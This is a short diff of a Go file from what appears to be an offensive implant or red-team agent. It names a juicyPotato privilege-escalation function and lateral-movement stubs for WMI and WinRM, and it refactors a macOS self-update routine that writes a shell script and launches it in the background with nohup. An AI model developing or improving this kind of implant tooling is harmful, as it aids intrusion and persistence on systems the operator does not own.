@@ -1430,22 +1430,16 @@ func juicyPotato(cmd string) (string, error) {
 func selfUpdateLinux(exe, tmpPath string) string { return "" }
 
 func selfUpdateDarwin(exe, tmpPath string) string {
-	shScript := fmt.Sprintf(
-		"#!/bin/sh\nsleep 1\ncp -f '%s' '%s'\nchmod +x '%s'\nexec '%s'\n",
-		tmpPath, exe, exe, exe)
 	tmpScript := exe + ".update.sh"
-	if err := os.WriteFile(tmpScript, []byte(shScript), 0755); err != nil {
+	if err := os.WriteFile(tmpScript, []byte(buildUnixUpdateScript(exe, tmpPath)), 0755); err != nil {
 		return "failed to write update script: " + err.Error()
 	}
-	cmd := exec.Command("/bin/sh", "-c", "nohup '"+tmpScript+"' >/dev/null 2>&1 &")
+	cmd := exec.Command("/bin/sh", "-c", "nohup "+shellQuote(tmpScript)+" >/dev/null 2>&1 &")
 	if err := cmd.Start(); err != nil {
 		return "failed to start updater: " + err.Error()
 	}
-	return "self-update: new binary downloaded, replacing and restarting..."
-}
-
-func lateralWMI(target, user, pass, cmd string) (string, error) {
-	return "", fmt.Errorf("lateral movement is Windows-only")
+	scheduleUpdateExit()
+	return "self-update: verified binary staged; supervisor will replace, health-check and roll back on failure"
 }
 func lateralWinRM(target, user, pass, cmd string) (string, error) {
 	return "", fmt.Errorf("lateral movement is Windows-only")
